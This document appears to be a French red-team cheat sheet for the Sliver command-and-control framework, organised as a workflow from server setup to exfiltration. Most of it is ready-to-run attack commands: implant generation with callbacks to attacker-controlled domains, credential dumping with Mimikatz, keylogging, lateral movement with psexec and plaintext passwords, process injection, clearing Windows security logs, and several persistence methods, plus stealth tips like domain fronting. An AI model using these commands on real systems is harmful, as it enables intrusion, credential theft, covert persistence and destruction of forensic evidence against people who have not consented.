# Sliver - Framework C2 Open Source

## 🗂️ Workflow d'utilisation Sliver
1. Installation et configuration du serveur C2
   ↓
2. Génération d'implants pour les cibles
   ↓
3. Déploiement et établissement des sessions
   ↓
4. Post-exploitation et mouvement latéral
   ↓
5. Persistence et maintien d'accès
   ↓
6. Exfiltration et nettoyage

## 📋 Vue d'ensemble

Sliver est un framework Command & Control (C2) open source moderne développé par BishopFox. Il offre des implants cross-platform avec communication chiffrée, techniques d'evasion avancées et interface utilisateur intuitive.

> **💡 Explication Simple** : C'est comme un centre de contrôle invisible qui vous permet de gérer à distance plusieurs ordinateurs compromis, avec des communications secrètes impossibles à détecter.

## ⚡ Installation et Setup

### Installation serveur
```bash
# Installation depuis binary releases
curl https://sliver.sh/install|sudo bash

# Compilation depuis source
git clone https://github.com/BishopFox/sliver.git
cd sliver
make
```

### Configuration initiale
```bash
# Démarrage serveur Sliver
sliver-server

# Interface client
sliver-client

# Configuration multi-utilisateur
new-operator --name john --lhost attacker.com
```

### Setup HTTPS listener
```bash
# Dans console Sliver
https --lhost 0.0.0.0 --lport 443 --domain company.com

# Avec certificat Let's Encrypt
https --lhost 0.0.0.0 --lport 443 --domain attacker.com --lets-encrypt

# HTTP listener
http --lhost 0.0.0.0 --lport 80 --domain company.com
```

## 🎯 Génération d'Implants

### Implants HTTP/HTTPS
```bash
# Implant Windows HTTPS
generate --http https://company.com --arch amd64 --format exe --save /tmp/implant.exe

# Implant Linux HTTP
generate --http http://company.com --os linux --arch amd64 --format elf --save /tmp/implant

# Implant MacOS
generate --http https://company.com --os darwin --arch amd64 --format macho --save /tmp/implant
```

### Implants DNS
```bash
# DNS C2 implant
generate --dns company.com --arch amd64 --format exe --save /tmp/dns-implant.exe

# DNS avec domaine frontal
generate --dns company.com --canaries company.com,legitimate.com --save /tmp/implant.exe
```

### Implants avec evasion
```bash
# Implant avec process injection
generate --http https://company.com --strategy spawn --format shellcode --save /tmp/shellcode.bin

# Implant service Windows
generate --http https://company.com --format service --save /tmp/service.exe

# DLL implant
generate --http https://company.com --format shared --save /tmp/implant.dll
```

## 🔧 Gestion des Sessions

### Interaction avec implants
```bash
# Lister sessions actives
sessions

# Interagir avec session
use [SESSION_ID]

# Informations session
info

# Processus et système
ps
getuid
whoami
pwd
```

### Commandes système de base
```bash
# Navigation fichiers
ls
cd /path/to/directory
pwd
cat /etc/passwd

# Upload/download
upload /local/file /remote/path
download /remote/file /local/path

# Exécution commandes
shell whoami
execute ls -la
```

## 🕵️ Post-Exploitation Avancée

### Process injection
```bash
# Migration vers processus
migrate [PID]

# Process injection
inject --pid [PID] --shellcode-path /path/to/shellcode

# Spawn process injection
spawn notepad.exe
```

### Credential harvesting
```bash
# Dump credentials
hashdump

# Mimikatz integration
execute-assembly mimikatz.exe "sekurlsa::logonpasswords"

# Registry dump
registry read --hive HKLM --path "SAM"
```

### Surveillance et monitoring
```bash
# Screenshot
screenshot

# Keylogger
keylogger start
keylogger dump
keylogger stop

# Process monitoring
ps -T
```

## 🌐 Lateral Movement

### Pivoting et proxying
```bash
# Port forwarding
portfwd add --remote-addr 192.168.1.10 --remote-port 3389 --local-port 3389

# SOCKS proxy
socks5 start --lport 1080

# Reverse port forward
rportfwd add --remote-addr 127.0.0.1 --remote-port 8080 --local-addr 192.168.1.100 --local-port 80
```

### Mouvement latéral
```bash
# PSExec lateral movement
psexec --hostname target.company.com --username admin --password pass123 --service-name updates

# WMI execution
wmiexec --hostname target.company.com --username admin --password pass123

# SMB beacon deployment
generate --http https://company.com --format exe --save /tmp/lateral.exe
upload /tmp/lateral.exe \\target\C$\Windows\Temp\update.exe
shell sc \\target create update binpath="C:\Windows\Temp\update.exe"
```

## 🎭 Techniques d'Evasion

### Process hollowing
```bash
# Process hollowing technique
generate --http https://company.com --strategy hollow --format exe --save /tmp/hollow.exe

# Parent process spoofing
generate --http https://company.com --strategy spawn --parent-pid [PID] --format exe
```

### DLL techniques
```bash
# DLL sideloading
generate --http https://company.com --format shared --save /tmp/legitimate.dll

# Reflective DLL injection
execute-dll /path/to/reflective.dll
```

### Anti-forensics
```bash
# Clear logs
shell wevtutil cl System
shell wevtutil cl Security
shell wevtutil cl Application

# Timestomping
shell powershell -c "(Get-Item file.exe).LastWriteTime = '01/01/2020 12:00:00'"

# Memory resident execution
execute-assembly --in-memory assembly.exe
```

## 🔄 Persistence Mechanisms

### Registry persistence
```bash
# Run key persistence
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\implant.exe"

# Service persistence
shell sc create "WindowsUpdate" binpath="C:\Windows\Temp\implant.exe" start=auto
shell sc start "WindowsUpdate"
```

### Scheduled tasks
```bash
# Scheduled task persistence
shell schtasks /create /tn "System Update" /tr "C:\Windows\Temp\implant.exe" /sc daily /st 09:00 /ru SYSTEM

# WMI event subscription
shell powershell -c "Register-WmiEvent -Query 'SELECT * FROM Win32_VolumeChangeEvent' -Action {Start-Process 'C:\Windows\Temp\implant.exe'}"
```

### Advanced persistence
```bash
# DLL hijacking persistence
upload implant.dll C:\Windows\System32\legitimate.dll

# COM hijacking
shell reg add "HKCU\Software\Classes\CLSID\{GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\implant.dll"
```

## 📊 Logging et Monitoring

### Session logging
```bash
# Activer logging complet
settings logs.level DEBUG

# Log file location
settings logs.file /var/log/sliver.log

# Session recording
record start
# ... activités ...
record stop
```

### Audit et reporting
```bash
# Export session info
sessions --export /tmp/sessions.json

# Command history
history --export /tmp/commands.txt

# Beacon tracking
beacons --track --export /tmp/beacons.log
```

## 🛡️ Operational Security

### Communication profiles
```bash
# Custom HTTP headers
generate --http https://company.com --http-header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Jitter configuration
generate --http https://company.com --jitter 30s

# Sleep intervals
generate --http https://company.com --reconnect-interval 60s
```

### Infrastructure masking
```bash
# Domain fronting
generate --http https://cloudfront.net --host-header company.com

# Redirectors usage
# Nginx/Apache redirector config needed

# Certificate pinning
generate --https https://company.com --cert-pin [SHA256_HASH]
```

## ⚠️ Erreurs fréquentes

### Configuration mistakes
- Utiliser des certificats auto-signés évidents
- Négliger la rotation des infrastructures C2
- Oublier de configurer des profiles de communication réalistes
- Exposer directement les serveurs C2

### Operational errors
- Laisser des implants actifs après mission
- Ne pas nettoyer les artefacts sur les systèmes
- Réutiliser les mêmes payloads sur plusieurs cibles
- Ignorer les indicateurs de détection (IoCs)

## 💡 Astuces

### Optimisation stealth
- Utiliser des domaines légitimes pour domain fronting
- Configurer des intervalles de callback variables (jitter)
- Implémenter des kill switches avec dates d'expiration
- Masquer le trafic C2 dans du trafic légitime

### Techniques avancées
- Intégrer avec infrastructure cloud (AWS/Azure)
- Utiliser des CDNs pour masquer l'origine
- Implémenter des canaux de communication de backup
- Automatiser la rotation des certificats SSL

## 🔗 Pour aller plus loin

- [Sliver Documentation](https://github.com/BishopFox/sliver)
- [Sliver Wiki](https://github.com/BishopFox/sliver/wiki)
- [C2 Infrastructure Guide](https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/)
- [MITRE ATT&CK C2 Techniques](https://attack.mitre.org/tactics/TA0011/)

## 🧭 Navigation

- [Guide Cobalt Strike](./Cobalt-Strike.md)
- [Guide Empire](../../03-Post-Exploitation/Tools-PostExploitation/Empire.md)
- [C2 Infrastructure](../C2-Infrastructure/)
- [Retour aux outils Red Team](./README.md) 